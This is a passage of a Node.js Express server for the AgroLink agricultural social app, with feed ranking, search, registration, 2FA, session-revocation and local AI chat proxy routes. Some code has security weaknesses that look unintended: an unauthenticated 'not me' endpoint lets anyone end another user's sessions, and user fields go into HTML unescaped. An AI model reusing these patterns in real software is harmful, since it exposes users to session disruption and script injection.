.foot{text-align:center;margin-top:24px;color:rgba(255,255,255,0.2);font-size:12px}
.foot span{color:#00e676;font-weight:700}</style>
</head>
<body>
<div class="wrap">
  <div class="topbar">
    <div class="brand">🌾 AgroLink</div>
    <a href="${DOMAIN}" style="color:#00e676;font-size:13px;text-decoration:none">Ana Sayfa →</a>
  </div>
  <div class="card">
    <a href="${profUrl}" style="text-decoration:none">
      <div class="author">
        <img class="avatar" src="${profPic}" alt="${post.name}" onerror="this.src='${DOMAIN}/agro.png'">
        <div><div class="aname">${post.name||post.username}${badge}</div><div class="ausr">@${post.username}</div></div>
      </div>
    </a>
    ${mediaHtml ? `<div class="media-wrap">${mediaHtml}</div>` : ''}
    ${post.content ? `<div class="body">${(post.content||'').replace(/<[^>]*>/g,'')}</div>` : ''}
    <div class="stats">
      <div>❤️ <strong>${post.likeCount||0}</strong></div>
      <div>💬 <strong>${post.commentCount||0}</strong></div>
    </div>
    <div class="time">${timeAgo}</div>
  </div>
  <div class="cta-area"><a class="cta" href="${DOMAIN}">📱 AgroLink'te Aç</a></div>
  <div class="foot">🌾 <span>AgroLink</span> — Tarım Topluluğu</div>
</div>
</body></html>`);
    } catch (e) {
        console.error('[POST SAYFASI] Hata:', e.message);
        res.redirect('/');
    }
});
// ==================== YENİ ROTALAR (SQLite→PG PORT) ====================

// ─── ANA FEED: /api/posts ───────────────────────────────────────────
// Karma algoritma: her 5 doğrulanmış posta 2 doğrulanmamış post karıştırılır
app.get('/api/posts', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 10 } = req.query;
        const pageNum = Math.max(1, parseInt(page) || 1);
        const limitNum = Math.min(parseInt(limit) || 10, 50);
        const offset = (pageNum - 1) * limitNum;

        const totalResult = await dbGet(
            `SELECT COUNT(*) as count FROM posts p JOIN users u ON p."userId" = u.id WHERE p."isActive" = TRUE AND u."isActive" = TRUE`
        );
        const total = totalResult ? parseInt(totalResult.count) : 0;

        // Mavi tikli post ID'leri
        const verifiedIds = await dbAll(
            `SELECT p.id FROM posts p JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE AND u."isActive" = TRUE AND u."isVerified" = TRUE
             ORDER BY p."createdAt" DESC`
        );
        // Mavi tiksiz post ID'leri
        const unverifiedIds = await dbAll(
            `SELECT p.id FROM posts p JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE AND u."isActive" = TRUE AND (u."isVerified" = FALSE OR u."isVerified" IS NULL)
             ORDER BY p."createdAt" DESC`
        );

        // 5:2 karıştırma algoritması
        let allIds = [];
        let vIdx = 0, uIdx = 0;
        while (vIdx < verifiedIds.length || uIdx < unverifiedIds.length) {
            for (let i = 0; i < 5 && vIdx < verifiedIds.length; i++) allIds.push(verifiedIds[vIdx++].id);
            for (let i = 0; i < 2 && uIdx < unverifiedIds.length; i++) allIds.push(unverifiedIds[uIdx++].id);
        }

        const pageIds = allIds.slice(offset, offset + limitNum);
        let posts = [];

        if (pageIds.length > 0) {
            const placeholders = pageIds.map((_, i) => `$${i + 3}`).join(',');
            posts = await dbAll(
                `SELECT p.*, u."profilePic" as "userProfilePic", u.name as "userName", u.username as "userUsername",
                    u."isVerified" as "userVerified", u."userType",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $2) as "isSaved"
                 FROM posts p JOIN users u ON p."userId" = u.id
                 WHERE p.id IN (${placeholders})`,
                [req.user.id, req.user.id, ...pageIds]
            );
            const postMap = new Map(posts.map(p => [p.id, p]));
            posts = pageIds.map(id => postMap.get(id)).filter(Boolean);
        }

        // commentsDisabled normalize et
        posts = posts.map(p => ({ ...p, commentsDisabled: p.allowComments === false || p.allowComments === 0 }));

        res.json({
            posts,
            hasMore: (offset + limitNum) < allIds.length,
            total,
            page: pageNum,
            totalPages: Math.ceil(allIds.length / limitNum)
        });
    } catch (error) {
        console.error('Ana feed hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ GÖNDERILER: /api/posts/new ───────────────────────────────
app.get('/api/posts/new', authenticateToken, async (req, res) => {
    try {
        const { since } = req.query;
        const sinceDate = since ? new Date(since) : new Date(Date.now() - 24 * 60 * 60 * 1000);

        const posts = await dbAll(
            `SELECT p.*, u."profilePic" as "userProfilePic", u.name as "userName", u."isVerified" as "userVerified",
                EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked"
             FROM posts p JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE AND u."isActive" = TRUE AND p."createdAt" > $2
             ORDER BY p."createdAt" DESC LIMIT 20`,
            [req.user.id, sinceDate.toISOString()]
        );

        res.json({ posts: posts.map(formatPost) });
    } catch (error) {
        console.error('Yeni gönderiler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── BEĞENİLEN GÖNDERILER: /api/posts/liked ────────────────────────
app.get('/api/posts/liked', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 10 } = req.query;
        const pageNum = Math.max(1, parseInt(page) || 1);
        const limitNum = Math.min(parseInt(limit) || 10, 100);
        const offset = (pageNum - 1) * limitNum;

        const posts = await dbAll(
            `SELECT p.*, u."profilePic" as "userProfilePic", u.name as "userName", TRUE as "isLiked",
                EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved"
             FROM likes l JOIN posts p ON l."postId" = p.id JOIN users u ON p."userId" = u.id
             WHERE l."userId" = $1 AND p."isActive" = TRUE
             ORDER BY l."createdAt" DESC LIMIT $2 OFFSET $3`,
            [req.user.id, limitNum, offset]
        );

        const totalResult = await dbGet(
            `SELECT COUNT(*) as count FROM likes l JOIN posts p ON l."postId" = p.id WHERE l."userId" = $1 AND p."isActive" = TRUE`,
            [req.user.id]
        );
        const total = parseInt(totalResult?.count || 0);

        res.json({ posts, hasMore: (pageNum * limitNum) < total, total, page: pageNum, totalPages: Math.ceil(total / limitNum) });
    } catch (error) {
        console.error('Beğenilenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── KAYDEDİLEN GÖNDERILER: /api/posts/saved ───────────────────────
app.get('/api/posts/saved', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 10 } = req.query;
        const pageNum = Math.max(1, parseInt(page) || 1);
        const limitNum = Math.min(parseInt(limit) || 10, 100);
        const offset = (pageNum - 1) * limitNum;

        const posts = await dbAll(
            `SELECT p.*, u."profilePic" as "userProfilePic", u.name as "userName", TRUE as "isSaved",
                EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked"
             FROM saves s JOIN posts p ON s."postId" = p.id JOIN users u ON p."userId" = u.id
             WHERE s."userId" = $1 AND p."isActive" = TRUE
             ORDER BY s."createdAt" DESC LIMIT $2 OFFSET $3`,
            [req.user.id, limitNum, offset]
        );

        const totalResult = await dbGet(
            `SELECT COUNT(*) as count FROM saves s JOIN posts p ON s."postId" = p.id WHERE s."userId" = $1 AND p."isActive" = TRUE`,
            [req.user.id]
        );
        const total = parseInt(totalResult?.count || 0);

        res.json({ posts: posts.map(formatPost), hasMore: (pageNum * limitNum) < total, total, page: pageNum, totalPages: Math.ceil(total / limitNum) });
    } catch (error) {
        console.error('Kaydedilenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EXPLORE FEED: /api/feed/explore ───────────────────────────────
// Takip edilmeyenlerin postları — aynı akıllı algoritma, sadece takip edilmeyenler
app.get('/api/feed/explore', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 10 } = req.query;
        const pageNum  = Math.max(1, parseInt(page) || 1);
        const limitNum = Math.min(parseInt(limit) || 10, 50);

        const userId = req.user.id;

        const dayOfYear = Math.floor(Date.now() / (1000 * 60 * 60 * 24));
        const userSeed  = parseInt(userId.replace(/-/g, '').slice(0, 8), 16);
        const dailySeed = (userSeed ^ dayOfYear) % 1000000;

        await dbRun(`DELETE FROM explore_seen_posts WHERE "seenAt" < NOW() - INTERVAL '24 hours'`, []).catch(() => {});

        const posts = await dbAll(
            `WITH
            user_tags AS (
                SELECT LOWER(interest) as tag FROM user_interests WHERE "userId" = $1
            ),
            friend_likes AS (
                SELECT DISTINCT l."postId"
                FROM likes l
                JOIN follows f ON f."followingId" = l."userId"
                WHERE f."followerId" = $1
                  AND l."createdAt" > NOW() - INTERVAL '48 hours'
            ),
            tag_match AS (
                SELECT ph."postId", COUNT(*) as match_count
                FROM post_hashtags ph
                JOIN hashtags h ON h.id = ph."hashtagId"
                WHERE LOWER(h.tag) IN (SELECT tag FROM user_tags)
                GROUP BY ph."postId"
            ),
            seen AS (
                SELECT "postId" FROM explore_seen_posts WHERE "userId" = $1
            ),
            scored AS (
                SELECT
                    p.*,
                    u."profilePic" as "userProfilePic",
                    u.name as "userName",
                    u."isVerified" as "userVerified",
                    u."hasFarmerBadge",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved",
                    CASE
                        WHEN p."createdAt" > NOW() - INTERVAL '48 hours' THEN 40
                        WHEN p."createdAt" > NOW() - INTERVAL '7 days'   THEN 20
                        WHEN p."createdAt" > NOW() - INTERVAL '30 days'  THEN 10
                        ELSE 0
                    END
                    + CASE
                        WHEN (p."likeCount" + p."commentCount" * 2) > 100 THEN 25
                        WHEN (p."likeCount" + p."commentCount" * 2) > 20  THEN 15
                        WHEN (p."likeCount" + p."commentCount" * 2) > 5   THEN 8
                        ELSE 0
                    END
                    + COALESCE((SELECT match_count * 30 FROM tag_match tm WHERE tm."postId" = p.id), 0)
                    + CASE WHEN p.id IN (SELECT "postId" FROM friend_likes) THEN 20 ELSE 0 END
                    + CASE WHEN u."isVerified" = TRUE THEN 10 ELSE 0 END
                    + CASE WHEN u."hasFarmerBadge" = TRUE THEN 10 ELSE 0 END
                    + CASE WHEN p.id IN (SELECT "postId" FROM seen) THEN -50 ELSE 0 END
                    + (((hashtext(p.id::text || $2::text) % 15) + 15) % 15) - 7
                    AS explore_score
                FROM posts p
                JOIN users u ON p."userId" = u.id
                WHERE p."isActive" = TRUE
                  AND u."isActive" = TRUE
                  -- Sadece takip EDİLMEYENLERİN postları
                  AND p."userId" NOT IN (
                      SELECT "followingId" FROM follows WHERE "followerId" = $1
                      UNION SELECT $1
                  )
                  AND u.id NOT IN (
                      SELECT "blockedId" FROM blocks WHERE "blockerId" = $1
                      UNION
                      SELECT "blockerId" FROM blocks WHERE "blockedId" = $1
                  )
            )
            SELECT * FROM scored
            ORDER BY explore_score DESC, "createdAt" DESC
            LIMIT $3 OFFSET $4`,
            [userId, dailySeed, limitNum, (pageNum - 1) * limitNum]
        );

        if (posts.length > 0) {
            const values = posts.map(p => `('${userId}', '${p.id}', NOW())`).join(',');
            dbRun(
                `INSERT INTO explore_seen_posts ("userId", "postId", "seenAt")
                 VALUES ${values}
                 ON CONFLICT ("userId", "postId") DO UPDATE SET "seenAt" = NOW()`,
                []
            ).catch(() => {});
        }

        // total count (pagination için)
        const totalResult = await dbGet(
            `SELECT COUNT(*) as count FROM posts p JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE AND u."isActive" = TRUE
               AND p."userId" NOT IN (SELECT "followingId" FROM follows WHERE "followerId" = $1 UNION SELECT $1)
               AND u.id NOT IN (SELECT "blockedId" FROM blocks WHERE "blockerId" = $1 UNION SELECT "blockerId" FROM blocks WHERE "blockedId" = $1)`,
            [userId]
        );
        const total = parseInt(totalResult?.count || 0);

        res.json({ posts, total, page: pageNum, totalPages: Math.ceil(total / limitNum), hasMore: (pageNum * limitNum) < total });
    } catch (error) {
        console.error('Explore feed hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── KULLANICI ARAMA: /api/users/search (query param: q) ───────────
app.get('/api/users/search', authenticateToken, async (req, res) => {
    try {
        const { q, page = 1, limit = 20 } = req.query;
        if (!q || q.length < 2) return res.json({ users: [], total: 0, page: 1, totalPages: 0 });

        const pageNum = Math.max(1, parseInt(page) || 1);
        const limitNum = Math.min(parseInt(limit) || 10, 15); // 🔒 Max 15 → kitlesel enum önleme
        const offset = (pageNum - 1) * limitNum;
        const searchTerm = `%${q}%`;

        const users = await dbAll(
            `SELECT u.id, u.username, u.name, u."profilePic", u.bio, u."isVerified",
                (SELECT COUNT(*) FROM follows WHERE "followingId" = u.id) as "followerCount",
                EXISTS(SELECT 1 FROM follows WHERE "followerId" = $1 AND "followingId" = u.id) as "isFollowing"
             FROM users u
             WHERE (u.username ILIKE $2 OR u.name ILIKE $2) AND u.id != $1 AND u."isActive" = TRUE
             ORDER BY u."isVerified" DESC,
                CASE WHEN u.username ILIKE $3 THEN 1 WHEN u.name ILIKE $3 THEN 2 ELSE 3 END,
                (SELECT COUNT(*) FROM follows WHERE "followingId" = u.id) DESC
             LIMIT $4 OFFSET $5`,
            [req.user.id, searchTerm, `${q}%`, limitNum, offset]
        );

        const totalResult = await dbGet(
            `SELECT COUNT(*) as count FROM users u WHERE (u.username ILIKE $1 OR u.name ILIKE $1) AND u.id != $2 AND u."isActive" = TRUE`,
            [searchTerm, req.user.id]
        );
        const total = parseInt(totalResult?.count || 0);

        res.json({ users, total, page: pageNum, totalPages: Math.ceil(total / limitNum), hasMore: pageNum < Math.ceil(total / limitNum) });
    } catch (error) {
        console.error('Kullanıcı arama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── TAKİP EDİLENLER: /api/users/following ─────────────────────────
app.get('/api/users/following', authenticateToken, async (req, res) => {
    try {
        const following = await dbAll(
            `SELECT u.id, u.name, u.username, u."profilePic", u."isVerified", u."userType", f."createdAt" as "followedAt"
             FROM follows f JOIN users u ON f."followingId" = u.id
             WHERE f."followerId" = $1 ORDER BY f."createdAt" DESC`,
            [req.user.id]
        );
        res.json({ following, count: following.length });
    } catch (error) {
        console.error('Takip edilenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── ENGELLENEN KULLANICILAR: /api/users/blocked ───────────────────
// Frontend res.data.blockedUsers bekliyor!
app.get('/api/users/blocked', authenticateToken, async (req, res) => {
    try {
        const blocked = await dbAll(
            `SELECT u.id, u.name, u.username, u."profilePic", b."createdAt" as "blockedAt"
             FROM blocks b JOIN users u ON b."blockedId" = u.id
             WHERE b."blockerId" = $1 ORDER BY b."createdAt" DESC`,
            [req.user.id]
        );
        // Her iki key adıyla döndür (frontend uyumluluğu)
        res.json({ blocked, blockedUsers: blocked, count: blocked.length });
    } catch (error) {
        console.error('Engellenenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── KAYIT DOĞRULAMA: /api/auth/register-verify ────────────────────
// register-init ile gönderilen 6 haneli kodu doğrular ve hesabı aktif eder
app.post('/api/auth/register-verify', validateAuthInput, async (req, res) => {
    try {
        const { email, code } = req.body;
        if (!email || !code) return res.status(400).json({ error: 'E-posta ve kod zorunludur' });

        const cleanEmail = email.toLowerCase().trim();

        // Doğrulama kodunu kontrol et
        const verification = await dbGet(
            `SELECT ev.*, u.id as "userId2" FROM email_verifications ev
             JOIN users u ON ev."userId" = u.id
             WHERE u.email = $1 AND ev.code = $2 AND ev.used = FALSE AND ev."expiresAt" > NOW()
             ORDER BY ev."createdAt" DESC LIMIT 1`,
            [cleanEmail, String(code)]
        );

        if (!verification) {
            return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş kod' });
        }

        // Kullanıcıyı doğrulandı olarak işaretle
        await dbRun(`UPDATE users SET "emailVerified" = TRUE, "updatedAt" = NOW() WHERE id = $1`, [verification.userId]);
        await dbRun(`DELETE FROM email_verifications WHERE "userId" = $1`, [verification.userId]);

        // 🌾 Yeni kullanıcı varsayılan hesapları takip etsin
        try {
            const defaultAccounts = ['agro_sosyal', 'agrolink_news', 'yemektarifleri', 'agroabot', 'akilli.tarlam'];
            for (const uname of defaultAccounts) {
                const acc = await dbGet('SELECT id FROM users WHERE username = $1', [uname]);
                if (acc) {
                    await dbRun(
                        'INSERT INTO follows (id, "followerId", "followingId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("followerId", "followingId") DO NOTHING',
                        [uuidv4(), verification.userId, acc.id]
                    );
                }
            }
        } catch (followErr) {
            console.warn('⚠️ Otomatik takip hatası:', followErr.message);
        }

        const user = await dbGet(
            `SELECT id, name, username, email, "profilePic", bio FROM users WHERE id = $1`,
            [verification.userId]
        );

        const tokens = generateTokens(user);

        res.status(201).json({
            token: tokens.accessToken,
            accessToken: tokens.accessToken,
            refreshToken: tokens.refreshToken,
            user,
            message: 'Kayıt başarıyla tamamlandı!'
        });
    } catch (error) {
        console.error('Kayıt doğrulama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 2FA DOĞRULAMA: /api/auth/verify-2fa ───────────────────────────
app.post('/api/auth/verify-2fa', validateAuthInput, async (req, res) => {
    try {
        const { tempToken, code } = req.body;
        if (!tempToken || !code) return res.status(400).json({ error: 'Token ve kod zorunludur' });

        let decoded;
        try {
            decoded = jwt.verify(tempToken, JWT_SECRET, { algorithms: ['HS256'] });
        } catch (err) {
            return res.status(401).json({ error: 'Geçersiz veya süresi dolmuş oturum. Lütfen tekrar giriş yapın.' });
        }

        if (!decoded.pending2FA) return res.status(400).json({ error: 'Geçersiz istek' });

        // 2FA kodunu doğrula
        const twofa = await dbGet(
            `SELECT * FROM two_factor_codes WHERE "userId" = $1 AND code = $2 AND "expiresAt" > NOW() AND used = FALSE
             ORDER BY "createdAt" DESC LIMIT 1`,
            [decoded.id, String(code)]
        );

        if (!twofa) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş 2FA kodu' });

        await dbRun(`UPDATE two_factor_codes SET used = TRUE WHERE id = $1`, [twofa.id]);

        const user = await dbGet(
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "userType", "hasFarmerBadge",
                    "isOnline", "isBanned", "emailVerified", "twoFactorEnabled"
             FROM users WHERE id = $1 AND "isActive" = TRUE`,
            [decoded.id]
        );
        if (!user) return res.status(401).json({ error: 'Kullanıcı bulunamadı' });

        await dbRun('UPDATE users SET "lastLogin" = NOW(), "isOnline" = TRUE, "updatedAt" = NOW() WHERE id = $1', [user.id]);
        dbRun(`INSERT INTO user_login_hours ("userId", hour) VALUES ($1, $2)`,
            [user.id, new Date().getHours()]).catch(() => {});
        const tokens = generateTokens(user);
        const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
        await dbRun(
            `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt")
             VALUES ($1, $2, $3, $4, $5, NOW(), NOW() + INTERVAL '7 days')`,
            [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
        );

        const { password: _, ...userWithoutPassword } = user;
        res.json({ token: tokens.accessToken, accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, user: userWithoutPassword, message: 'Giriş başarılı!' });
    } catch (error) {
        console.error('2FA doğrulama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 2FA KOD YENİLE: /api/auth/resend-2fa ──────────────────────────
app.post('/api/auth/resend-2fa', async (req, res) => {
    try {
        const { tempToken } = req.body;
        if (!tempToken) return res.status(400).json({ error: 'Token zorunludur' });

        let decoded;
        try {
            decoded = jwt.verify(tempToken, JWT_SECRET, { algorithms: ['HS256'] });
        } catch (err) {
            return res.status(401).json({ error: 'Geçersiz veya süresi dolmuş oturum.' });
        }

        if (!decoded.pending2FA) return res.status(400).json({ error: 'Geçersiz istek' });

        const user = await dbGet('SELECT id, email, name FROM users WHERE id = $1 AND "isActive" = TRUE', [decoded.id]);
        if (!user) return res.status(401).json({ error: 'Kullanıcı bulunamadı' });

        // Yeni kod oluştur
        const newCode = crypto.randomInt(100000, 999999).toString();
        // ✅ DÜZELTME: PostgreSQL interval
        await dbRun(
            `INSERT INTO two_factor_codes (id, "userId", code, purpose, "expiresAt", used, "createdAt")
             VALUES ($1, $2, $3, $4, NOW() + INTERVAL '10 minutes', FALSE, NOW())`,
            [uuidv4(), user.id, newCode, 'login']
        );

        sendEmail(user.email, '🔐 Agrolink — Yeni 2FA Kodunuz',
            `<p>Yeni giriş doğrulama kodunuz: <strong style="font-size:24px">${newCode}</strong></p><p>10 dakika geçerlidir.</p>`
        ).catch(() => {});

        res.json({ message: 'Yeni doğrulama kodu e-posta adresinize gönderildi.' });
    } catch (error) {
        console.error('2FA kod yenileme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── BU BEN DEĞİLİM: POST /api/auth/not-me ─────────────────────────
// Şüpheli giriş bildirimi — IP engeller, oturumları kapatır, şifre sıfırlama başlatır
app.post('/api/auth/not-me', async (req, res) => {
    try {
        const { email, username } = req.body;
        if (!email && !username) return res.status(400).json({ error: 'Email veya kullanıcı adı gereklidir' });

        const loginId = (email || username).toLowerCase().trim();
        const user = await dbGet(
            'SELECT * FROM users WHERE (email = $1 OR username = $1) AND "isActive" = TRUE',
            [loginId]
        );
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        const now = new Date().toISOString();
        const resetToken = crypto.randomBytes(32).toString('hex');
        // ✅ DÜZELTME: PostgreSQL interval

        // Şüpheli giriş raporunu kaydet
        await dbRun(
            `INSERT INTO suspicious_login_reports (id, "userId", "reportedIp", "reportedAt", "passwordResetToken", "tokenExpiresAt")
             VALUES ($1, $2, $3, $4, $5, NOW() + INTERVAL '10 minutes')
             ON CONFLICT DO NOTHING`,
            [uuidv4(), user.id, req.ip, now, resetToken]
        ).catch(() => {});

        // Tüm refresh token'ları iptal et (oturumları kapat)
        await dbRun('DELETE FROM refresh_tokens WHERE "userId" = $1', [user.id]).catch(() => {});

        // E-posta bildirimi gönder
        sendEmail(user.email, '⚠️ Agrolink — Şüpheli Giriş Bildirimi',
            `<p>Hesabınıza şüpheli bir giriş yapıldı ve siz bunu bildirdiniz.</p>
             <p>Tüm oturumlarınız sonlandırıldı. Lütfen şifrenizi değiştirin.</p>
             <p>Şifre sıfırlama bağlantısı: <a href="${process.env.APP_URL || "https://sehitumitkestitarimmtal.com"}/api/auth/reset-password-direct?token=${resetToken}">Buraya tıklayın</a></p>`
        ).catch(() => {});

        res.json({
            success: true,
            message: 'Güvenlik önlemleri aktifleştirildi. Oturumlarınız sonlandırıldı.',
            actions: { sessionTerminated: true, passwordResetRequired: true }
        });
    } catch (error) {
        console.error('Bu ben değilim hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── BU BEN DEĞİLİM LINK: GET /api/auth/not-me ─────────────────────
app.get('/api/auth/not-me', async (req, res) => {
    const { token } = req.query;
    if (!token) return res.status(400).send('<h2>Geçersiz bağlantı</h2>');
    res.send(`<h2>Güvenlik bildirimi alındı. Oturumlarınız sonlandırıldı. Lütfen şifrenizi değiştirin.</h2>`);
});

// ─── AI CHAT: /api/ai-chat ──────────────────────────────────────────
const LLAMA_CPP_URL = process.env.LLAMA_CPP_URL || 'http://localhost:8080';
const AI_TIMEOUT_MS = parseInt(process.env.AI_TIMEOUT_MS) || 60000;

app.post('/api/ai-chat', authenticateToken, async (req, res) => {
    const { messages, stream = false, model, max_tokens, temperature } = req.body;
    if (!messages || !Array.isArray(messages) || messages.length === 0) {
        return res.status(400).json({ error: 'messages dizisi gerekli' });
    }
    // 🔒 FIX 1a: Mesaj dizisi boyutu limiti (Token Pump saldırısı önlemi)
    // 1000 mesaj × 8000 karakter = 8MB → AI API maliyet bombası
    const MAX_MESSAGES = 50; // konuşma geçmişi için yeterli
    if (messages.length > MAX_MESSAGES) {
        return res.status(400).json({ error: `Maksimum ${MAX_MESSAGES} mesaj gönderilebilir` });
    }
    // 🔒 FIX 1b: Toplam karakter limiti
    let totalChars = 0;
    for (const msg of messages) {
        if (!msg || typeof msg !== 'object') continue;
        if (typeof msg.content === 'string') {
            if (msg.content.length > 4000) {
                return res.status(400).json({ error: 'Tek mesaj max 4000 karakter olabilir' });
            }
            totalChars += msg.content.length;
        }
    }
    if (totalChars > 20000) {
        return res.status(400).json({ error: 'Toplam mesaj boyutu çok büyük (max 20.000 karakter)' });
    }
    // 🔒 FIX 1c: Model whitelist — kullanıcı pahalı model seçemesin
    const ALLOWED_MODELS = ['default', 'llama3', 'llama-3', 'mistral', 'gemma', null, undefined];
    const safeModel = ALLOWED_MODELS.includes(model) ? (model || 'default') : 'default';
    // 🔒 FIX 1d: role whitelist — sadece user/assistant/system
    const ALLOWED_ROLES = new Set(['user', 'assistant', 'system']);
    const safeMessages = messages
        .filter(m => m && typeof m === 'object' && ALLOWED_ROLES.has(m.role))
        .map(m => ({ role: m.role, content: String(m.content || '').slice(0, 4000) }));
    if (safeMessages.length === 0) {
        return res.status(400).json({ error: 'Geçerli mesaj bulunamadı' });
    }
    try {
        const { default: fetch } = await import('node-fetch');
        const ctrl = new AbortController();
        const timeout = setTimeout(() => ctrl.abort(), AI_TIMEOUT_MS);
        const llamaBody = {
            model: safeModel,
            messages: safeMessages,
            stream: !!stream,
            max_tokens: Math.min(parseInt(max_tokens) || 1024, 4096),
            temperature: Math.min(parseFloat(temperature) || 0.7, 2.0)
        };
        const llamaRes = await fetch(LLAMA_CPP_URL + '/v1/chat/completions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(llamaBody),
            signal: ctrl.signal
        });
        clearTimeout(timeout);
        if (!llamaRes.ok) {
            const errTxt = await llamaRes.text().catch(() => '');
            return res.status(llamaRes.status).json({ error: 'AI hatası: ' + llamaRes.status, detail: errTxt.slice(0, 200) });
        }
        if (stream) {
            res.setHeader('Content-Type', 'text/event-stream');
            res.setHeader('Cache-Control', 'no-cache');
            res.setHeader('X-Accel-Buffering', 'no');
            llamaRes.body.pipe(res);
            llamaRes.body.on('error', () => res.end());
            req.on('close', () => llamaRes.body.destroy());
        } else {
            const data = await llamaRes.json();
            res.json(data);
        }
    } catch (error) {
        if (error.name === 'AbortError') {
            return res.status(504).json({ error: 'AI sunucusu zaman aşımı.', code: 'AI_TIMEOUT' });
        }
        res.status(503).json({ error: 'AI sunucusuna bağlanılamadı.', hint: `llama.cpp çalışıyor mu? (${LLAMA_CPP_URL})`, code: 'AI_OFFLINE' });
    }
});

app.get('/api/ai-chat/health', authenticateToken, async (req, res) => {
    try {
        const { default: fetch } = await import('node-fetch');
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 4000);
        const r = await fetch(LLAMA_CPP_URL + '/health', { signal: ctrl.signal });
        clearTimeout(t);
        res.json({ online: r.ok, status: r.status });
    } catch {
        res.json({ online: false });
    }
});

// ─── HASHTAG ARAMA: /api/hashtags/search ───────────────────────────
app.get('/api/hashtags/search', authenticateToken, async (req, res) => {
    try {
        const { q } = req.query;
        if (!q) return res.json({ hashtags: [] });

        const hashtags = await dbAll(
            `SELECT tag, COUNT(*) as count FROM (
                SELECT unnest(regexp_matches(content, '#([A-Za-z0-9_ğüşıöçĞÜŞİÖÇ]+)', 'g')) as tag FROM posts WHERE "isActive" = TRUE
             ) t WHERE tag ILIKE $1 GROUP BY tag ORDER BY count DESC LIMIT 20`,
            [`${q}%`]
        );
        res.json({ hashtags });
    } catch (error) {
        console.error('Hashtag arama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── HASHTAG POSTLARI: /api/hashtags/:tag/posts ────────────────────
app.get('/api/hashtags/:tag/posts', authenticateToken, async (req, res) => {
    try {
        const { tag } = req.params;
        const { page = 1, limit = 10 } = req.query;
        const pageNum = Math.max(1, parseInt(page) || 1);
        const limitNum = Math.min(parseInt(limit) || 10, 50);
        const offset = (pageNum - 1) * limitNum;

        const posts = await dbAll(
            `SELECT p.*, u."profilePic" as "userProfilePic", u.name as "userName", u."isVerified" as "userVerified",
                EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved"
             FROM posts p JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE AND u."isActive" = TRUE AND p.content ILIKE $2
             ORDER BY p."createdAt" DESC LIMIT $3 OFFSET $4`,
            [req.user.id, `%#${tag}%`, limitNum, offset]
        );

        res.json({ posts, tag, page: pageNum });
    } catch (error) {
        console.error('Hashtag postları hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EN ÇOK TAKİP EDİLENLER: /api/users/top-followed ──────────────
app.get('/api/users/top-followed', authenticateToken, async (req, res) => {
    try {
        const limit = Math.min(parseInt(req.query.limit) || 10, 50);
        const users = await dbAll(
            `SELECT u.id, u.name, u.username, u."profilePic", u."isVerified", u."userType", u.bio,
                (SELECT COUNT(*) FROM follows WHERE "followingId" = u.id) as "followersCount",
                EXISTS(SELECT 1 FROM follows WHERE "followerId" = $1 AND "followingId" = u.id) as "isFollowing"
             FROM users u WHERE u.id != $1 AND u."isActive" = TRUE
             ORDER BY (SELECT COUNT(*) FROM follows WHERE "followingId" = u.id) DESC LIMIT $2`,
            [req.user.id, limit]
        );
        res.json({ users });
    } catch (error) {
        console.error('Top kullanıcılar hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── PUSH VAPID: /api/push/vapid-public-key ────────────────────────
app.get('/api/push/vapid-public-key', (req, res) => {
    res.json({ publicKey: process.env.VAPID_PUBLIC_KEY || null });
});


